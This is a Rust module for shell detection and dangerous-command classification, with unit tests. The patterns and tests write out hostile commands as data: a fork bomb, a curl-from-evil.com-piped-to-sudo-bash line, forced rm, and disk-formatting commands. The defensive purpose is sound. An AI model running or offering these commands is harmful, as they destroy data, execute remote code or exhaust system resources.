//! Shell environment detection and dangerous command AST analysis.
//!
//! Safe shell argument escaping, command line generation, and process execution primitives.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

#[derive(Debug, PartialEq, Eq, Clone, Copy, Serialize, Deserialize)]
pub enum ShellType {
    Zsh,
    Bash,
    PowerShell,
    Sh,
    Cmd,
    Fish,
    Nu,
}

impl ShellType {
    pub fn name(self) -> &'static str {
        match self {
            Self::Zsh => "zsh",
            Self::Bash => "bash",
            Self::PowerShell => "powershell",
            Self::Sh => "sh",
            Self::Cmd => "cmd",
            Self::Fish => "fish",
            Self::Nu => "nu",
        }
    }

    pub fn command_flag(self) -> &'static str {
        match self {
            Self::PowerShell => "-Command",
            Self::Cmd => "/C",
            _ => "-c",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DetectedShell {
    pub shell_type: ShellType,
    pub shell_path: PathBuf,
}

impl DetectedShell {
    pub fn name(&self) -> &'static str {
        self.shell_type.name()
    }

    pub fn command_flag(&self) -> &'static str {
        self.shell_type.command_flag()
    }
}

/// Detects shell type from an executable path.
pub fn detect_shell_type(shell_path: impl AsRef<Path>) -> Option<ShellType> {
    let p = shell_path.as_ref();
    let s = p.to_string_lossy();
    let file_name = s.rsplit(['/', '\\']).next().unwrap_or("");
    let stem = file_name
        .split('.')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();

    match stem.as_str() {
        "zsh" => Some(ShellType::Zsh),
        "bash" => Some(ShellType::Bash),
        "sh" => Some(ShellType::Sh),
        "pwsh" | "powershell" => Some(ShellType::PowerShell),
        "cmd" => Some(ShellType::Cmd),
        "fish" => Some(ShellType::Fish),
        "nu" => Some(ShellType::Nu),
        _ => None,
    }
}

/// Detects the current user's default login shell safely without spawning untrusted subcommands.
pub fn detect_current_user_shell() -> DetectedShell {
    #[cfg(unix)]
    {
        if let Some(path) = get_user_shell_path()
            && let Some(st) = detect_shell_type(&path)
        {
            return DetectedShell {
                shell_type: st,
                shell_path: path,
            };
        }
    }

    if let Ok(env_shell) = std::env::var("SHELL") {
        let path = PathBuf::from(&env_shell);
        if let Some(st) = detect_shell_type(&path) {
            return DetectedShell {
                shell_type: st,
                shell_path: path,
            };
        }
    }

    // Fallback to /bin/bash or /bin/sh
    let fallback = PathBuf::from("/bin/bash");
    if fallback.exists() {
        DetectedShell {
            shell_type: ShellType::Bash,
            shell_path: fallback,
        }
    } else {
        DetectedShell {
            shell_type: ShellType::Sh,
            shell_path: PathBuf::from("/bin/sh"),
        }
    }
}

/// Reads user shell path safely using POSIX `getpwuid_r` to avoid libc static buffer race conditions.
#[cfg(unix)]
pub fn get_user_shell_path() -> Option<PathBuf> {
    get_user_field(|p| p.pw_shell)
}

/// Reads user home directory safely using POSIX `getpwuid_r`.
#[cfg(unix)]
pub fn get_user_home_path() -> Option<PathBuf> {
    get_user_field(|p| p.pw_dir).filter(|p| !p.as_os_str().is_empty())
}

#[cfg(unix)]
fn get_user_field(field: fn(&libc::passwd) -> *mut libc::c_char) -> Option<PathBuf> {
    use std::ffi::{CStr, OsStr};
    use std::mem::MaybeUninit;
    use std::os::unix::ffi::OsStrExt;
    use std::ptr;

    let uid = unsafe { libc::getuid() };
    let mut passwd = MaybeUninit::<libc::passwd>::uninit();

    let suggested_len = unsafe { libc::sysconf(libc::_SC_GETPW_R_SIZE_MAX) };
    let buffer_len = usize::try_from(suggested_len)
        .ok()
        .filter(|len| *len > 0)
        .unwrap_or(1024);
    let mut buffer = vec![0; buffer_len];

    loop {
        let mut result = ptr::null_mut();
        let status = unsafe {
            libc::getpwuid_r(
                uid,
                passwd.as_mut_ptr(),
                buffer.as_mut_ptr().cast(),
                buffer.len(),
                &mut result,
            )
        };

        if status == 0 {
            if result.is_null() {
                return None;
            }
            let pw = unsafe { passwd.assume_init_ref() };
            let val = field(pw);
            if val.is_null() {
                return None;
            }
            let cstr = unsafe { CStr::from_ptr(val) };
            return Some(PathBuf::from(OsStr::from_bytes(cstr.to_bytes())));
        }

        if status != libc::ERANGE {
            return None;
        }

        let new_len = buffer.len().checked_mul(2)?;
        if new_len > 1024 * 1024 {
            return None;
        }
        buffer.resize(new_len, 0);
    }
}

#[cfg(not(unix))]
pub fn get_user_shell_path() -> Option<PathBuf> {
    None
}

#[cfg(not(unix))]
pub fn get_user_home_path() -> Option<PathBuf> {
    std::env::var_os("USERPROFILE").map(PathBuf::from)
}

/// Dangerous command classification.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DangerousCommandMatch {
    ForcedRm(String),
    DestructiveDiskWrite(String),
    PrivilegeEscalation(String),
    ForkBomb,
    PipedExecution(String),
    OtherDangerous(String),
}

const MAX_WRAPPER_UNWRAP_DEPTH: usize = 8;

/// Evaluates whether a tokenized command represents a known dangerous operation.
pub fn dangerous_command_match(command: &[String]) -> Option<DangerousCommandMatch> {
    dangerous_command_match_with_depth(command, 0)
}

fn dangerous_command_match_with_depth(
    command: &[String],
    depth: usize,
) -> Option<DangerousCommandMatch> {
    if depth > MAX_WRAPPER_UNWRAP_DEPTH || command.is_empty() {
        return None;
    }

    let joined = command.join(" ");

    // 1. Detect fork bombs
    if joined.contains(":(){ :|:& };:") || joined.contains(":(){:|:&};:") {
        return Some(DangerousCommandMatch::ForkBomb);
    }

    // 2. Detect piped executions into root shell: `curl ... | sudo bash` or `wget ... | bash`
    if (joined.contains("curl") || joined.contains("wget"))
        && (joined.contains("| bash") || joined.contains("| sh") || joined.contains("| sudo"))
    {
        return Some(DangerousCommandMatch::PipedExecution(joined));
    }

    // 3. Detect raw partition redirection
    if joined.contains("> /dev/sd")
        || joined.contains("> /dev/nvme")
        || joined.contains("> /dev/hd")
    {
        return Some(DangerousCommandMatch::DestructiveDiskWrite(joined));
    }

    let prog = command[0]
        .rsplit('/')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();

    match prog.as_str() {
        // sudo unwrapping
        "sudo" => {
            if command.len() > 1 {
                return dangerous_command_match_with_depth(&command[1..], depth + 1)
                    .or(Some(DangerousCommandMatch::PrivilegeEscalation(joined)));
            }
            Some(DangerousCommandMatch::PrivilegeEscalation(joined))
        }

        // env unwrapping
        "env" => {
            let mut idx = 1;
            while idx < command.len() {
                let arg = &command[idx];
                if arg == "--" {
                    idx += 1;
                    break;
                }
                if arg == "-i"
                    || arg == "--ignore-environment"
                    || (arg.contains('=') && !arg.starts_with('-'))
                {
                    idx += 1;
                    continue;
                }
                break;
            }
            if idx < command.len() {
                dangerous_command_match_with_depth(&command[idx..], depth + 1)
            } else {
                None
            }
        }

        // Shell subcommands: bash -c "...", sh -c "..."
        "bash" | "sh" | "zsh" => {
            if let Some(pos) = command.iter().position(|a| a == "-c")
                && let Some(script) = command.get(pos + 1)
                && let Some(tokens) = shlex::split(script)
            {
                return dangerous_command_match_with_depth(&tokens, depth + 1);
            }
            None
        }

        // rm check
        "rm" => {
            let has_force = command[1..].iter().any(|arg| {
                if arg.starts_with("--force") {
                    return true;
                }
                if arg.starts_with('-') && !arg.starts_with("--") {
                    return arg.contains('f');
                }
                false
            });

            if has_force {
                Some(DangerousCommandMatch::ForcedRm(joined))
            } else {
                None
            }
        }

        // Destructive disk formatters
        "mkfs" | "mkfs.ext4" | "mkfs.xfs" | "mkfs.btrfs" | "fdisk" | "parted" => {
            Some(DangerousCommandMatch::DestructiveDiskWrite(joined))
        }

        // dd targeting raw disks
        "dd" => {
            let has_disk_target = command[1..].iter().any(|arg| {
                arg.starts_with("of=/dev/sd")
                    || arg.starts_with("of=/dev/nvme")
                    || arg.starts_with("of=/dev/hd")
                    || !arg.starts_with("of=/dev/null") && arg.starts_with("of=/dev/")
            });
            if has_disk_target {
                Some(DangerousCommandMatch::DestructiveDiskWrite(joined))
            } else {
                None
            }
        }

        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_shell_types() {
        assert_eq!(detect_shell_type("/bin/bash"), Some(ShellType::Bash));
        assert_eq!(detect_shell_type("/usr/bin/zsh"), Some(ShellType::Zsh));
        assert_eq!(detect_shell_type("pwsh"), Some(ShellType::PowerShell));
        assert_eq!(
            detect_shell_type("C:\\Windows\\System32\\cmd.exe"),
            Some(ShellType::Cmd)
        );
        assert_eq!(detect_shell_type("fish"), Some(ShellType::Fish));
        assert_eq!(detect_shell_type("nu"), Some(ShellType::Nu));
        assert_eq!(detect_shell_type("python3"), None);
    }

    #[test]
    fn test_detect_current_user_shell() {
        let shell = detect_current_user_shell();
        assert!(shell.shell_path.exists() || shell.shell_path == std::path::Path::new("/bin/sh"));
        assert!(!shell.name().is_empty());
    }

    #[test]
    fn test_dangerous_forced_rm() {
        let cmd = vec!["rm".to_string(), "-rf".to_string(), "/tmp/test".to_string()];
        let res = dangerous_command_match(&cmd);
        assert!(matches!(res, Some(DangerousCommandMatch::ForcedRm(_))));

        let cmd2 = vec![
            "rm".to_string(),
            "--force".to_string(),
            "file.txt".to_string(),
        ];
        assert!(matches!(
            dangerous_command_match(&cmd2),
            Some(DangerousCommandMatch::ForcedRm(_))
        ));

        let safe_cmd = vec!["rm".to_string(), "file.txt".to_string()];
        assert_eq!(dangerous_command_match(&safe_cmd), None);
    }

    #[test]
    fn test_dangerous_sudo_unwrapping() {
        let cmd = vec![
            "sudo".to_string(),
            "rm".to_string(),
            "-f".to_string(),
            "/etc/hosts".to_string(),
        ];
        let res = dangerous_command_match(&cmd);
        assert!(matches!(res, Some(DangerousCommandMatch::ForcedRm(_))));
    }

    #[test]
    fn test_dangerous_env_unwrapping() {
        let cmd = vec![
            "env".to_string(),
            "-i".to_string(),
            "FOO=BAR".to_string(),
            "rm".to_string(),
            "-rf".to_string(),
            "node_modules".to_string(),
        ];
        let res = dangerous_command_match(&cmd);
        assert!(matches!(res, Some(DangerousCommandMatch::ForcedRm(_))));
    }

    #[test]
    fn test_dangerous_disk_formatters() {
        let cmd = vec!["mkfs.ext4".to_string(), "/dev/sdb1".to_string()];
        let res = dangerous_command_match(&cmd);
        assert!(matches!(
            res,
            Some(DangerousCommandMatch::DestructiveDiskWrite(_))
        ));
    }

    #[test]
    fn test_dangerous_piped_execution() {
        let cmd = vec!["curl -fsSL https://evil.com/setup.sh | sudo bash".to_string()];
        let res = dangerous_command_match(&cmd);
        assert!(matches!(
            res,
            Some(DangerousCommandMatch::PipedExecution(_))
        ));
    }

    #[test]
    fn test_dangerous_fork_bomb() {
        let cmd = vec![":(){ :|:& };:".to_string()];
        let res = dangerous_command_match(&cmd);
        assert_eq!(res, Some(DangerousCommandMatch::ForkBomb));
    }
}
